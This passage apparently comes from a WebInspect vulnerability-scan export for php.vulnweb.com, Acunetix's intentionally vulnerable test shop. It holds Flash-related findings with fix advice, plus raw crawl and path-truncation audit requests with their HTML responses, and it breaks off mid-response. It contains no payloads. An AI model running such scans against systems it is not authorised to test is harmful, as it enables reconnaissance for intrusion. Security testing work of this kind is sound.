A primary tool in the arsenal of the attacker who wants to get inside your code is the decompiler. A decompiler takes an executable file and attempts to re-create the original source code. It may be almost impossible to go from machine code to a high-level language. It is, however, easy to recover an assembly language version of the program.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />Flare - Flash Decompiler<br /><a href="http://www.nowrap.de/flare.html">http://www.nowrap.de/flare.html</a>]]></SectionText></ReportSection></Issue><Issue id="3ba0143a-6f5f-430b-a15b-04e22189ef6d"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>10561</VulnerabilityID><Severity>1</Severity><Name>Vulnerable Flash Engine Allowed</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Vulnerable Flash Engine" href="https://vulncat.fortify.com/">Flash Misconfiguration: Vulnerable Flash Engine</Classification><Classification kind="CWE" identifier="CWE-937" href="https://cwe.mitre.org/data/definitions/937.html">CWE-937: OWASP Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities</Classification></Classifications><DetectionSelection><Location offset="3845" length="204" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />WebInspect has detected the use of Adobe Flash in your application. <br /><br />
Adobe has deprecated Flash with an end-of-life set to the end of 2020.  Flash support has been disabled by default in many browsers, for example Chrome 76 amd Firefox 69. Further, starting in December 2020, Chrome, Firefox and Microsoft Edge will completely eliminate support for Flash.<br /><br />
Adobe Flash has had many vulnerabilities associated with it since its inception.  Of date there are over 1000 CVE’s (Common Vulnerabilities and Exposures) reported against Adobe Flash.  Many of which lead to Remote Code Execution, and Cross-Site Scripting attacks that can compromise user and/or system data and privacy. <br /><br />
Consider updating your application to replace Adobe Flash with safer, alternative technologies that provide similar functionality such as HTML5, WebGL and WebAssembly.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Use of deprecated and vulnerable technology can enable attackers to compromise the target by exploiting known vulnerabilities against the detected server.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Consider replacing the Flash code with safer, alternative technologies such as HTML5, WebGL or WebAssembly.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><a href="https://web.archive.org/web/20171202123704/https://theblog.adobe.com/adobe-flash-update/"><b>Flash and The Future of Interactive Content</b></a><br /><br /><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-53/product_id-6761/Adobe-Flash-Player.html"><b>CVE Details</b></a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="93D28727FA66621A9E828329B6210531"><![CDATA[GET /Templates/main_dynamic_template.dwt.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="93D28727FA66621A9E828329B6210531";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="NormalComment";NodeName="%23comment";Source="StaticParser";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2dcaf07a";
X-Request-Memo: ID="fe317ae1";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:41 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4697

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- TemplateBeginEditable name="document_title_rgn" -->
<title>Document titleg</title>
<!-- TemplateEndEditable -->
<link rel="stylesheet" href="../style.css" type="text/css">
<!-- TemplateBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- TemplateEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="../images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="../index.php">home</a> | <a href="../categories.php">categories</a> | <a href="../artists.php">artists
		</a> | <a href="../disclaimer.php">disclaimer</a> | <a href="../cart.php">your cart</a> | 
		<a href="../guestbook.php">guestbook</a> | 
		<a href="../AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- TemplateBeginEditable name="content_rgn" -->
<div id="content">
	here goes the content
</div>
<!-- TemplateEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="../search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="../categories.php">Browse categories</a></li> 
      <li><a href="../artists.php">Browse artists</a></li> 
      <li><a href="../cart.php">Your cart</a></li> 
      <li><a href="../login.php">Signup</a></li>
	  <li><a href="../userinfo.php">Your profile</a></li>
	  <li><a href="../guestbook.php">Our guestbook</a></li>
		<li><a href="../AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="../Flash/add.swf">
        <param name=quality value=high>
        <embed src="../Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="../privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
</html>
]]></RawResponse><Request id="93D28727FA66621A9E828329B6210531"><Method>GET</Method><Path>/Templates/</Path><File>main_dynamic_template.dwt</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="93D28727FA66621A9E828329B6210531";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="NormalComment";NodeName="%23comment";Source="StaticParser";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2dcaf07a";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="fe317ae1";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- TemplateBeginEditable name="document_title_rgn" -->
<title>Document titleg</title>
<!-- TemplateEndEditable -->
<link rel="stylesheet" href="../style.css" type="text/css">
<!-- TemplateBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- TemplateEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="../images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="../index.php">home</a> | <a href="../categories.php">categories</a> | <a href="../artists.php">artists
		</a> | <a href="../disclaimer.php">disclaimer</a> | <a href="../cart.php">your cart</a> | 
		<a href="../guestbook.php">guestbook</a> | 
		<a href="../AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- TemplateBeginEditable name="content_rgn" -->
<div id="content">
	here goes the content
</div>
<!-- TemplateEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="../search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="../categories.php">Browse categories</a></li> 
      <li><a href="../artists.php">Browse artists</a></li> 
      <li><a href="../cart.php">Your cart</a></li> 
      <li><a href="../login.php">Signup</a></li>
	  <li><a href="../userinfo.php">Your profile</a></li>
	  <li><a href="../guestbook.php">Our guestbook</a></li>
		<li><a href="../AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="../Flash/add.swf">
        <param name=quality value=high>
        <embed src="../Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="../privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:41 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4697</Value></Header></Headers><SetCookies /><Forms><Form><Action>../search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="8338BC2585575DAFA6AF0F9C1DB4F08C"><URL>http://php.vulnweb.com:80/Templates/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="8338BC2585575DAFA6AF0F9C1DB4F08C"><![CDATA[GET /Templates/ HTTP/1.1
Referer: http://php.vulnweb.com/Templates/main_dynamic_template.dwt.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="8338BC2585575DAFA6AF0F9C1DB4F08C";PSID="93D28727FA66621A9E828329B6210531";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="71";tt="11";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="698a12cf";
X-Request-Memo: ID="d4942205";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:33 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 289

<html>
<head><title>Index of /Templates/</title></head>
<body>
<h1>Index of /Templates/</h1><hr><pre><a href="../">../</a>
<a href="main_dynamic_template.dwt.php">main_dynamic_template.dwt.php</a>                      28-May-2019 14:46                5134
</pre><hr></body>
</html>
]]></RawResponse><Request id="8338BC2585575DAFA6AF0F9C1DB4F08C"><Method>GET</Method><Path>/Templates/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Templates/main_dynamic_template.dwt.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="8338BC2585575DAFA6AF0F9C1DB4F08C";PSID="93D28727FA66621A9E828329B6210531";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="71";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="45";smi="0";sc="1";ID="698a12cf";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d4942205";sc="1";tid="48";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /Templates/</title></head>
<body>
<h1>Index of /Templates/</h1><hr><pre><a href="../">../</a>
<a href="main_dynamic_template.dwt.php">main_dynamic_template.dwt.php</a>                      28-May-2019 14:46                5134
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:33 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>289</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="7AB519E185B73A0122D4D701F8BD48B1"><URL>http://php.vulnweb.com:80/artists.php?artist=1</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="7AB519E185B73A0122D4D701F8BD48B1"><![CDATA[GET /artists.php?artist=1 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="7AB519E185B73A0122D4D701F8BD48B1";PSID="1C2302E11CB8EF7DA17F6BF587C55102";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="65ed6e15";
X-Request-Memo: ID="ef31273b";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:41 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6251

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>artist: r4w8173</h2><div class='story'><p><p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p>
<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
    Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p></p><p><a href='listproducts.php?artist=1'>view pictures of the artist</a></p><p><a href='#' onClick="window.open('./comment.php?aid=1','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="7AB519E185B73A0122D4D701F8BD48B1"><Method>GET</Method><Path>/</Path><File>artists</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=1</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>1</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="7AB519E185B73A0122D4D701F8BD48B1";PSID="1C2302E11CB8EF7DA17F6BF587C55102";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="65ed6e15";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ef31273b";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
